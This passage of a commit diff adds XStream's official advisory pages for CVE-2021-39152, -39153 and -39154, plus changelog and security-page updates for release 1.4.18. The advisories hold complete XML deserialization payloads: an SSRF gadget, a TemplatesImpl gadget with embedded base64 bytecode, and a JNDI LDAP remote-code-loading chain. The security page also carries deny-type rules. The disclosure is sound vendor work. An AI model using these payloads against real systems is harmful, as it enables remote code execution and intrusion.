          "156: xstream.fromXML(xml);",
          "157: </pre></div>",
          "159:     <p>Depending on the JDK, the code from the remote server is executed as soon as the XML gets unmarshalled.</p>",
          "161:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "163:     <h2 id=\"impact\">Impact</h2>",
          "165:     <p>The vulnerability may allow a remote attacker to execute arbitrary code only by manipulating the processed",
          "166:     input stream.</p>",
          "168:     <h2 id=\"workarounds\">Workarounds</h2>",
          "170:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "172:     <h2 id=\"credits\">Credits</h2>",
          "174:     <p>Smi1e of DBAPPSecurity WEBIN Lab found and reported the issue to XStream and provided the required information to reproduce it.</p>",
          "176:       </body>",
          "177:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-39152.html||xstream-distribution/src/content/CVE-2021-39152.html": [
          "File: xstream-distribution/src/content/CVE-2021-39152.html -> xstream-distribution/src/content/CVE-2021-39152.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 10. July 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-39152</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-39152: A Server-Side Forgery Request can be activated unmarshalling with XStream to access data streams",
          "20:     from an arbitrary URL referencing a resource in an intranet or the local host.</p>",
          "22:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "24:     <p>All versions until and including version 1.4.17 are affected, if using the version out of the box with Java",
          "25:     runtime version 14 to 8.  No user is affected, who followed the recommendation to setup",
          "26:     <a href=\"security.html#framework\">XStream's security framework</a> with a whitelist limited to the minimal",
          "27:     required types.</p>",
          "29:     <h2 id=\"description\">Description</h2>",
          "31:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "32:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "33:     input stream and replace or inject objects, that result in a server-side forgery request.</p>",
          "35:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "37:     <p>Create a simple HashMap and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "38:     unmarshal it again with XStream:</p>",
          "39: <div class=\"Source XML\"><pre>&lt;map&gt;",
          "40:   &lt;entry&gt;",
          "41:     &lt;jdk.nashorn.internal.runtime.Source_-URLData&gt;",
          "42:       &lt;url&gt;http://localhost:8080/internal/&lt;/url&gt;",
          "43:       &lt;cs&gt;GBK&lt;/cs&gt;",
          "44:       &lt;hash&gt;1111&lt;/hash&gt;",
          "45:       &lt;array&gt;b&lt;/array&gt;",
          "46:       &lt;length&gt;0&lt;/length&gt;",
          "47:       &lt;lastModified&gt;0&lt;/lastModified&gt;",
          "48:     &lt;/jdk.nashorn.internal.runtime.Source_-URLData&gt;",
          "49:     &lt;jdk.nashorn.internal.runtime.Source_-URLData reference='../jdk.nashorn.internal.runtime.Source_-URLData'/&gt;",
          "50:   &lt;/entry&gt;",
          "51:   &lt;entry&gt;",
          "52:     &lt;jdk.nashorn.internal.runtime.Source_-URLData&gt;",
          "53:       &lt;url&gt;http://localhost:8080/internal/&lt;/url&gt;",
          "54:       &lt;cs reference='../../../entry/jdk.nashorn.internal.runtime.Source_-URLData/cs'/&gt;",
          "55:       &lt;hash&gt;1111&lt;/hash&gt;",
          "56:       &lt;array&gt;b&lt;/array&gt;",
          "57:       &lt;length&gt;0&lt;/length&gt;",
          "58:       &lt;lastModified&gt;0&lt;/lastModified&gt;",
          "59:     &lt;/jdk.nashorn.internal.runtime.Source_-URLData&gt;",
          "60:     &lt;jdk.nashorn.internal.runtime.Source_-URLData reference='../jdk.nashorn.internal.runtime.Source_-URLData'/&gt;",
          "61:   &lt;/entry&gt;",
          "62: &lt;/map&gt;",
          "63: </pre></div>",
          "64: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "65: xstream.fromXML(xml);",
          "66: </pre></div>",
          "68:     <p>As soon as the XML gets unmarshalled, the payload gets executed and the data from the URL location is collected.</p>",
          "70:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "72:     <h2 id=\"impact\">Impact</h2>",
          "74:  <p>The vulnerability may allow a remote attacker to request data from internal resources that are not publicly",
          "75:  available only by manipulating the processed input stream.</p>",
          "77:     <h2 id=\"workarounds\">Workarounds</h2>",
          "79:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "81:     <h2 id=\"credits\">Credits</h2>",
          "83:     <p>m0d9 of the Security Team of Alibaba Cloud found and reported the issue to XStream and provided the required",
          "84:     information to reproduce it.</p>",
          "86:       </body>",
          "87:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-39153.html||xstream-distribution/src/content/CVE-2021-39153.html": [
          "File: xstream-distribution/src/content/CVE-2021-39153.html -> xstream-distribution/src/content/CVE-2021-39153.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 11. July 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-39153</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-39153: XStream is vulnerable to an Arbitrary Code Execution attack.</p>",
          "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "23:     <p>All versions until and including version 1.4.17 are affected, if using the version out of the box with Java",
          "24:     runtime version 14 to 8 or with JavaFX installed.  No user is affected, who followed the recommendation to setup",
          "25:     <a href=\"security.html#framework\">XStream's security framework</a> with a whitelist limited to the minimal required",
          "26:     types.</p>",
          "28:     <h2 id=\"description\">Description</h2>",
          "30:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "31:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "32:     input stream and replace or inject objects, that result in execution of arbitrary code loaded from a remote server.</p>",
          "34:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "36:     <p>Create a simple PriorityQueue and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "37:     unmarshal it again with XStream:</p>",
          "38: <div class=\"Source XML\"><pre>&lt;java.util.PriorityQueue serialization='custom'&gt;",
          "39:   &lt;unserializable-parents/&gt;",
          "40:   &lt;java.util.PriorityQueue&gt;",
          "41:     &lt;default&gt;",
          "42:       &lt;size&gt;2&lt;/size&gt;",
          "43:       &lt;comparator class='com.sun.java.util.jar.pack.PackageWriter$2'&gt;",
          "44:         &lt;outer-class&gt;",
          "45:           &lt;verbose&gt;0&lt;/verbose&gt;",
          "46:           &lt;effort&gt;0&lt;/effort&gt;",
          "47:           &lt;optDumpBands&gt;false&lt;/optDumpBands&gt;",
          "48:           &lt;optDebugBands&gt;false&lt;/optDebugBands&gt;",
          "49:           &lt;optVaryCodings&gt;false&lt;/optVaryCodings&gt;",
          "50:           &lt;optBigStrings&gt;false&lt;/optBigStrings&gt;",
          "51:           &lt;isReader&gt;false&lt;/isReader&gt;",
          "52:           &lt;bandHeaderBytePos&gt;0&lt;/bandHeaderBytePos&gt;",
          "53:           &lt;bandHeaderBytePos0&gt;0&lt;/bandHeaderBytePos0&gt;",
          "54:           &lt;archiveOptions&gt;0&lt;/archiveOptions&gt;",
          "55:           &lt;archiveSize0&gt;0&lt;/archiveSize0&gt;",
          "56:           &lt;archiveSize1&gt;0&lt;/archiveSize1&gt;",
          "57:           &lt;archiveNextCount&gt;0&lt;/archiveNextCount&gt;",
          "58:           &lt;attrClassFileVersionMask&gt;0&lt;/attrClassFileVersionMask&gt;",
          "59:           &lt;attrIndexTable class='com.sun.javafx.fxml.BeanAdapter'&gt;",
          "60:             &lt;bean class='com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl' serialization='custom'&gt;",
          "61:               &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;",
          "62:                 &lt;default&gt;",
          "63:                   &lt;__name&gt;Pwnr&lt;/__name&gt;",
          "64:                   &lt;__bytecodes&gt;",
          "65:                     &lt;byte-array&gt;yv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEAKG9wZW4gL1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBAB55c29zZXJpYWwvUHduZXIyMDU0MTY0NDMxMDIwMTkBACBMeXNvc2VyaWFsL1B3bmVyMjA1NDE2NDQzMTAyMDE5OwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC8ADgAAAAwAAQAAAAUADwA4AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAADQADgAAACAAAwAAAAEADwA4AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAADgADgAAACoABAAAAAEADwA4AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAEANgAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACQ==&lt;/byte-array&gt;",
          "66:                     &lt;byte-array&gt;yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJ&lt;/byte-array&gt;",
          "67:                   &lt;/__bytecodes&gt;",
          "68:                   &lt;__transletIndex&gt;-1&lt;/__transletIndex&gt;",
          "69:                   &lt;__indentNumber&gt;0&lt;/__indentNumber&gt;",
          "70:                 &lt;/default&gt;",
          "71:               &lt;/com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;",
          "72:             &lt;/bean&gt;",
          "73:             &lt;localCache&gt;",
          "74:               &lt;methods&gt;",
          "75:                 &lt;entry&gt;",
          "76:                   &lt;string&gt;getOutputProperties&lt;/string&gt;",
          "77:                   &lt;list&gt;",
          "78:                     &lt;method&gt;",
          "79:                       &lt;class&gt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/class&gt;",
          "80:                       &lt;name&gt;getOutputProperties&lt;/name&gt;",
          "81:                       &lt;parameter-types/&gt;",
          "82:                     &lt;/method&gt;",
          "83:                   &lt;/list&gt;",
          "84:                 &lt;/entry&gt;",
          "85:               &lt;/methods&gt;",
          "86:             &lt;/localCache&gt;",
          "87:           &lt;/attrIndexTable&gt;",
          "88:           &lt;shortCodeHeader__h__limit&gt;0&lt;/shortCodeHeader__h__limit&gt;",
          "89:         &lt;/outer-class&gt;",
          "90:       &lt;/comparator&gt;",
          "91:     &lt;/default&gt;",
          "92:     &lt;int&gt;3&lt;/int&gt;",
          "93:     &lt;string-array&gt;",
          "94:       &lt;string&gt;yxxx&lt;/string&gt;",
          "95:       &lt;string&gt;outputProperties&lt;/string&gt;",
          "96:     &lt;/string-array&gt;",
          "97:     &lt;string-array&gt;",
          "98:       &lt;string&gt;yxxx&lt;/string&gt;",
          "99:     &lt;/string-array&gt;",
          "100:   &lt;/java.util.PriorityQueue&gt;",
          "101: &lt;/java.util.PriorityQueue&gt;",
          "102: </pre></div>",
          "103: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "104: xstream.fromXML(xml);",
          "105: </pre></div>",
          "107:     <p>Depending on the JDK, the code from the remote server is executed as soon as the XML gets unmarshalled.</p>",
          "109:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "111:     <h2 id=\"impact\">Impact</h2>",
          "113:     <p>The vulnerability may allow a remote attacker to execute arbitrary code only by manipulating the processed",
          "114:     input stream.</p>",
          "116:     <h2 id=\"workarounds\">Workarounds</h2>",
          "118:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "120:     <h2 id=\"credits\">Credits</h2>",
          "122:     <p>Ceclin and YXXX from the Tencent Security Response Center found and reported the issue to XStream and provided",
          "123:     the required information to reproduce it.</p>",
          "125:       </body>",
          "126:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-39154.html||xstream-distribution/src/content/CVE-2021-39154.html": [
          "File: xstream-distribution/src/content/CVE-2021-39154.html -> xstream-distribution/src/content/CVE-2021-39154.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 31. July 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-39154</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-39154: XStream is vulnerable to an Arbitrary Code Execution attack.</p>",
          "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "23:  <p>All versions until and including version 1.4.17 are affected, if using the version out of the box. No user is",
          "24:  affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security",
          "25:  framework</a> with a whitelist limited to the minimal required types.</p>",
          "27:     <h2 id=\"description\">Description</h2>",
          "29:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "30:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "31:     input stream and replace or inject objects, that result in execution of arbitrary code loaded from a remote server.</p>",
          "33:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "35:  <p>Create a simple TreeSet and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "36:  unmarshal it again with XStream:</p>",
          "37: <div class=\"Source XML\"><pre>&lt;sorted-set&gt;",
          "38:   &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "39:     &lt;type&gt;ysomap&lt;/type&gt;",
          "40:     &lt;value class='javax.swing.MultiUIDefaults' serialization='custom'&gt;",
          "41:       &lt;unserializable-parents/&gt;",
          "42:       &lt;hashtable&gt;",
          "43:         &lt;default&gt;",
          "44:           &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;",
          "45:           &lt;threshold&gt;525&lt;/threshold&gt;",
          "46:         &lt;/default&gt;",
          "47:         &lt;int&gt;700&lt;/int&gt;",
          "48:         &lt;int&gt;0&lt;/int&gt;",
          "49:       &lt;/hashtable&gt;",
          "50:       &lt;javax.swing.UIDefaults&gt;",
          "51:         &lt;default&gt;",
          "52:           &lt;defaultLocale&gt;zh_CN&lt;/defaultLocale&gt;",
          "53:           &lt;resourceCache/&gt;",
          "54:         &lt;/default&gt;",
          "55:       &lt;/javax.swing.UIDefaults&gt;",
          "56:       &lt;javax.swing.MultiUIDefaults&gt;",
          "57:         &lt;default&gt;",
          "58:           &lt;tables&gt;",
          "59:             &lt;javax.swing.UIDefaults serialization='custom'&gt;",
          "60:               &lt;unserializable-parents/&gt;",
          "61:               &lt;hashtable&gt;",
          "62:                 &lt;default&gt;",
          "63:                   &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;",
          "64:                   &lt;threshold&gt;525&lt;/threshold&gt;",
          "65:                 &lt;/default&gt;",
          "66:                 &lt;int&gt;700&lt;/int&gt;",
          "67:                 &lt;int&gt;1&lt;/int&gt;",
          "68:                 &lt;string&gt;ggg&lt;/string&gt;",
          "69:                 &lt;javax.swing.UIDefaults_-ProxyLazyValue&gt;",
          "70:                   &lt;className&gt;javax.naming.InitialContext&lt;/className&gt;",
          "71:                   &lt;methodName&gt;doLookup&lt;/methodName&gt;",
          "72:                   &lt;args&gt;",
          "73:                     &lt;arg&gt;ldap://localhost:1099/CallRemoteMethod&lt;/arg&gt;",
          "74:                   &lt;/args&gt;",
          "75:                 &lt;/javax.swing.UIDefaults_-ProxyLazyValue&gt;",
          "76:               &lt;/hashtable&gt;",
          "77:               &lt;javax.swing.UIDefaults&gt;",
          "78:                 &lt;default&gt;",
          "79:                   &lt;defaultLocale reference='../../../../../../../javax.swing.UIDefaults/default/defaultLocale'/&gt;",
          "80:                   &lt;resourceCache/&gt;",
          "81:                 &lt;/default&gt;",
          "82:               &lt;/javax.swing.UIDefaults&gt;",
          "83:             &lt;/javax.swing.UIDefaults&gt;",
          "84:           &lt;/tables&gt;",
          "85:         &lt;/default&gt;",
          "86:       &lt;/javax.swing.MultiUIDefaults&gt;",
          "87:     &lt;/value&gt;",
          "88:   &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "89:   &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "90:     &lt;type&gt;ysomap&lt;/type&gt;",
          "91:     &lt;value class='com.sun.org.apache.xpath.internal.objects.XString'&gt;",
          "92:       &lt;m__obj class='string'&gt;test&lt;/m__obj&gt;",
          "93:     &lt;/value&gt;",
          "94:   &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "95: &lt;/sorted-set&gt;",
          "96: </pre></div>",
          "97: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "98: xstream.fromXML(xml);",
          "99: </pre></div>",
          "101:     <p>Depending on the JDK, the code from the remote server is executed as soon as the XML gets unmarshalled or when",
          "102:     another element is added to the set.</p>",
          "104:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "106:     <h2 id=\"impact\">Impact</h2>",
          "108:  <p>The vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by",
          "109:  manipulating the processed input stream.</p>",
          "111:     <h2 id=\"workarounds\">Workarounds</h2>",
          "113:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "115:     <h2 id=\"credits\">Credits</h2>",
          "117:     <p>ka1n4t found and reported the issue to XStream and provided the required information to reproduce it.</p>",
          "119:    </body>",
          "120:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html": [
          "File: xstream-distribution/src/content/changes.html -> xstream-distribution/src/content/changes.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "101:   <li>No support for Hibernate 3 collections.</li>",
          "102:  </ul>",
          "104:  <h1 id=\"upcoming-1.4.x\">Upcoming 1.4.x maintenance release</h1>",
          "106:  <p>Not yet released.</p>",
          "108:  <h2>Minor changes</h2>",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "104: <!--",
          "108: -->",
          "110:  <h1 id=\"1.4.18\">1.4.18</h1>",
          "112:  <p>Released August 22, 2021.</p>",
          "114:  <p class=\"highlight\">This maintenance release addresses following security vulnerabilities, when unmarshalling with",
          "115:  an XStream instance using the default blacklist of an uninitialized security framework.  XStream is therefore now",
          "116:  using a whitelist by default.</p>",
          "118:  <ul>",
          "119:   <li><a href=\"CVE-2021-39139.html\">CVE-2021-39139</a></li>",
          "120:   <li><a href=\"CVE-2021-39140.html\">CVE-2021-39140</a></li>",
          "121:   <li><a href=\"CVE-2021-39141.html\">CVE-2021-39141</a></li>",
          "122:   <li><a href=\"CVE-2021-39144.html\">CVE-2021-39144</a></li>",
          "123:   <li><a href=\"CVE-2021-39145.html\">CVE-2021-39145</a></li>",
          "124:   <li><a href=\"CVE-2021-39146.html\">CVE-2021-39146</a></li>",
          "125:   <li><a href=\"CVE-2021-39147.html\">CVE-2021-39147</a></li>",
          "126:   <li><a href=\"CVE-2021-39148.html\">CVE-2021-39148</a></li>",
          "127:   <li><a href=\"CVE-2021-39149.html\">CVE-2021-39149</a></li>",
          "128:   <li><a href=\"CVE-2021-39150.html\">CVE-2021-39150</a></li>",
          "129:   <li><a href=\"CVE-2021-39151.html\">CVE-2021-39151</a></li>",
          "130:   <li><a href=\"CVE-2021-39152.html\">CVE-2021-39152</a></li>",
          "131:   <li><a href=\"CVE-2021-39153.html\">CVE-2021-39153</a></li>",
          "132:   <li><a href=\"CVE-2021-39154.html\">CVE-2021-39154</a></li>",
          "133:  </ul>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html": [
          "File: xstream-distribution/src/content/security.html -> xstream-distribution/src/content/security.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "50:         <th>Description</th>",
          "51:       </tr>",
          "52:       <tr>",
          "54:         <td></td>",
          "55:         <td></td>",
          "56:       </tr>",
          "57:       <tr>",
          "",
          "[Removed Lines]",
          "53:         <th>Version 1.4.16</th>",
          "",
          "[Added Lines]",
          "53:         <th>Version 1.4.17</th>",
          "55:       </tr>",
          "56:       <tr>",
          "57:         <th><a href=\"CVE-2021-39139.html\">CVE-2021-39139</a></th>",
          "58:         <td>XStream is vulnerable to an Arbitrary Code Execution attack.</td>",
          "59:       </tr>",
          "60:       <tr>",
          "61:         <th><a href=\"CVE-2021-39140.html\">CVE-2021-39140</a></th>",
          "62:         <td>XStream can cause a Denial of Service.</td>",
          "63:       </tr>",
          "64:       <tr>",
          "65:         <th><a href=\"CVE-2021-39141.html\">CVE-2021-39141</a></th>",
          "66:         <td>XStream is vulnerable to an Arbitrary Code Execution attack.</td>",
          "67:       </tr>",
          "68:       <tr>",
          "69:         <th><a href=\"CVE-2021-39144.html\">CVE-2021-39144</a></th>",
          "70:         <td>XStream is vulnerable to a Remote Command Execution attack.</td>",
          "71:       </tr>",
          "72:       <tr>",
          "73:         <th><a href=\"CVE-2021-39145.html\">CVE-2021-39145</a></th>",
          "74:         <td>XStream is vulnerable to an Arbitrary Code Execution attack.</td>",
          "75:       </tr>",
          "76:       <tr>",
          "77:         <th><a href=\"CVE-2021-39146.html\">CVE-2021-39146</a></th>",
          "78:         <td>XStream is vulnerable to an Arbitrary Code Execution attack.</td>",
          "79:       </tr>",
          "80:       <tr>",
          "81:         <th><a href=\"CVE-2021-39147.html\">CVE-2021-39147</a></th>",
          "82:         <td>XStream is vulnerable to an Arbitrary Code Execution attack.</td>",
          "83:       </tr>",
          "84:       <tr>",
          "85:         <th><a href=\"CVE-2021-39148.html\">CVE-2021-39148</a></th>",
          "86:         <td>XStream is vulnerable to an Arbitrary Code Execution attack.</td>",
          "87:       </tr>",
          "88:       <tr>",
          "89:         <th><a href=\"CVE-2021-39149.html\">CVE-2021-39149</a></th>",
          "90:         <td>XStream is vulnerable to an Arbitrary Code Execution attack.</td>",
          "91:       </tr>",
          "92:       <tr>",
          "93:         <th><a href=\"CVE-2021-39150.html\">CVE-2021-39150</a></th>",
          "94:         <td>A Server-Side Forgery Request can be activated unmarshalling with XStream to access data streams from an",
          "95:         arbitrary URL referencing a resource in an intranet or the local host.</td>",
          "96:       </tr>",
          "97:       <tr>",
          "98:         <th><a href=\"CVE-2021-39151.html\">CVE-2021-39151</a></th>",
          "99:         <td>XStream is vulnerable to an Arbitrary Code Execution attack.</td>",
          "100:       </tr>",
          "101:       <tr>",
          "102:         <th><a href=\"CVE-2021-39152.html\">CVE-2021-39152</a></th>",
          "103:         <td>A Server-Side Forgery Request can be activated unmarshalling with XStream to access data streams from an",
          "104:         arbitrary URL referencing a resource in an intranet or the local host.</td>",
          "105:       </tr>",
          "106:       <tr>",
          "107:         <th><a href=\"CVE-2021-39153.html\">CVE-2021-39153</a></th>",
          "108:         <td>XStream is vulnerable to an Arbitrary Code Execution attack.</td>",
          "109:       </tr>",
          "110:       <tr>",
          "111:         <th><a href=\"CVE-2021-39154.html\">CVE-2021-39154</a></th>",
          "112:         <td>XStream is vulnerable to an Arbitrary Code Execution attack.</td>",
          "113:       </tr>",
          "114:       <tr>",
          "115:         <th>Version 1.4.16</th>",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "61:       <tr>",
          "62:         <th>Version 1.4.15</th>",
          "63:         <td></td>",
          "65:       </tr>",
          "66:       <tr>",
          "67:         <th><a href=\"CVE-2021-21341.html\">CVE-2021-21341</a></th>",
          "",
          "[Removed Lines]",
          "64:         <td></td>",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------",
          "--- Hunk 3 ---",
          "[Context before]",
          "406:     <h2 id=\"workaround\">Workarounds for older XStream versions</h2>",
          "408:     <p>As recommended, use XStream's security framework to implement a whitelist for the allowed types. This is",
          "415:     add these lines to XStream's setup code:</p>",
          "416: <div class=\"Source Java\"><pre>xstream.denyTypesByRegExp(new String[]{ \".*\\\\.Lazy(?:Search)?Enumeration.*\", \"(?:java|sun)\\\\.rmi\\\\..*\" });",
          "417: </pre></div>",
          "421: xstream.denyTypeHierarchy(java.io.InputStream.class );",
          "422: xstream.denyTypeHierarchy(java.nio.channels.Channel.class );",
          "423: xstream.denyTypeHierarchy(javax.activation.DataSource.class );",
          "424: xstream.denyTypeHierarchy(javax.sql.rowset.BaseRowSet.class );",
          "425: </pre></div>",
